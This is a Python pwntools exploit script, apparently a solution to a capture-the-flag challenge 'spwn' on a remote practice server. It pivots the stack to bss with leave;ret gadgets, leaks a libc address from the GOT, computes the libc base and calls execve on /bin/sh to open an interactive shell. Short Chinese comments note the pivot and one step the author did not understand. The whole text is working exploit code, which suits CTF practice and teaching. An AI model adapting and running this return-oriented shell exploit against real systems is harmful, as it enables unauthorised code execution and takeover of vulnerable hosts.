from pwn import *
context.log_level = 'debug'
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
#p = process("./spwn")
p = remote("pwn.buuoj.cn", 20145)

elf = ELF("./spwn")
if args.G:
	gdb.attach(p)
bss = 0x804a300
lev_ret = 0x8048511
pop3_ret = 0x80485a9
vun = 0x804849b
read = 0x8048501
#两次leave ret将栈迁移至bss，并构造read返回到下次输入
payload = p32(bss+20)+p32(elf.plt['write'])+p32(lev_ret)+p32(1)+p32(elf.got['read'])+p32(4)+p32(elf.plt['read'])+p32(pop3_ret)+p32(0)+p32(bss+40)+p32(0x50)+p32(vun)*5

p.sendafter("name?", payload)
payload = 'a'*0x18 + p32(bss) + p32(lev_ret)*2

p.sendafter("say?", payload)
puts_addr = u32(p.recv(4))
log.success("puts_addr == > " + hex(puts_addr))
libc_base = puts_addr - libc.sym['read']
binsh = libc_base + libc.search('/bin/sh').next()
log.success("libc_base == > " + hex(libc_base))
execve = libc_base + libc.sym['execve']
p.send(p32(execve)+p32(bss-48)+p32(binsh)+p32(0)+p32(0))
#此处不太明白为什么一定要设置这个返回地址，否则crash
p.interactive()
